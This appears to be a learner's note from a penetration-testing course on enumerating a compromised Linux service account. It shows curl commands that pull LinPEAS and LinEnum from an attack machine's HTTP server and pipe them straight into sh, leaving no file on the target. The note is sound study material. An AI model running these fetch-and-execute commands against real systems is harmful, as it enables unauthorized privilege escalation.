# Enumerating the Compromised Service Account

In this lesson, it was explained how to run LinPEAS and LinEnum on the target machine without first saving the scripts as files on the target.

Generally, we want to avoid leaving unnecessary files on the target machine during an assessment. Instead, the scripts can be hosted on the attack machine and accessed from the target over HTTP.

This uses the same Python web server from the previous lesson:

```bash
python3 -m http.server
```

Once the web server is running on the attack machine, the scripts can be accessed from the target.

## Running LinPEAS

LinPEAS can be accessed with `curl` and passed directly to the shell:

```bash
curl http://192.168.122.1:8000/linpeas.sh | sh -s -- -a
```

Or without the `-a` option:

```bash
curl http://192.168.122.1:8000/linpeas.sh | sh -s
```

## Running LinEnum

The same method can be used with LinEnum:

```bash
curl http://192.168.122.1:8000/LinEnum.sh | sh -s -- -t
```

Or:

```bash
curl http://192.168.122.1:8000/LinEnum.sh | sh -s
```

These commands retrieve the script from the HTTP server running on the attack machine and pass it directly to the shell on the target.

Both LinPEAS and LinEnum can take some time to complete because they perform a large amount of enumeration on the target.

I already knew that a downloaded LinPEAS script could be run like this:

```bash
./linpeas.sh -a
```

However, I wasn't familiar with the `curl ... | sh -s` method. I looked into it separately and found that it retrieves the script from the web server and passes it directly to `sh` instead of saving the script as a file first.
